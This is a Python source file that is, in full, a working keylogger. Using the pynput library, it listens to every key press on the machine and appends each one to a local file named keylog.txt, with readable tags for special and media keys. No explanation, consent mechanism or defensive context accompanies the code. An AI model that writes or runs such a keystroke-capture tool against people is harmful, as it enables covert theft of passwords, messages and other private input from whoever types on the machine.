from pynput.keyboard import Key, Listener

def logKeyPress(key):
    try:
        fle = open('keylog.txt', 'a')
        if key == Key.esc:
            fle.write("{ESCAPE}\n")
        elif key == Key.enter:
            fle.write("{ENTER}\n")
        elif key == Key.space:
            fle.write("{SPACE}\n")
        elif key == Key.backspace:
            fle.write("{BACKSPACE}\n")
        elif key == Key.shift_l:
            fle.write("{LEFT-SHIFT}\n")
        elif key == Key.shift_r:
            fle.write("{RIGHT-SHIFT}\n")
        elif key == Key.ctrl_l:
            fle.write("{LEFT-CTRL}\n")
        elif key == Key.ctrl_r:
            fle.write("{RIGHT-CTRL}\n")
        elif key == Key.caps_lock:
            fle.write("{CAPS-LOCK}\n")
        elif key == Key.home:
            fle.write("{HOME}\n")
        elif key == Key.num_lock:
            fle.write("{NUM-LOCK}\n")
        elif key == Key.delete:
            fle.write("{DELETE}\n")
        elif key == Key.insert:
            fle.write("{INSERT}\n")
        elif key == Key.end:
            fle.write("{END}\n")
        elif key == Key.page_up:
            fle.write("{PAGE-UP}\n")
        elif key == Key.page_down:
            fle.write("{PAGE-DOWN}\n")
        elif key == Key.pause:
            fle.write("{PAUSE/BREAK}\n")
        elif key == Key.media_next:
            fle.write("{MEDIA-NEXT}\n")
        elif key == Key.media_previous:
            fle.write("{MEDIA-PREVIOUS}\n")
        elif key == Key.media_play_pause:
            fle.write("{MEDIA-PAUSE/MEDIA-PLAY}\n")
        elif key == Key.media_volume_down:
            fle.write("{MEDIA-VOLUME-DOWN}\n")
        elif key == Key.media_volume_up:
            fle.write("{MEDIA-VOLUME-UP}\n")
        elif key == Key.alt_l:
            fle.write("{LEFT-ALT}\n")
        elif key == Key.alt_r:
            fle.write("{RIGHT-ALT}\n")
        elif key == Key.tab:
            fle.write("{TAB}\n")
        else:
            key = str(key).replace("'", '')
            fle.write(f"{key}")
        fle.close()
    except Exception as e:
        print(f"ERROR:{e}")

with Listener(on_press=logKeyPress) as listener:
    listener.join()


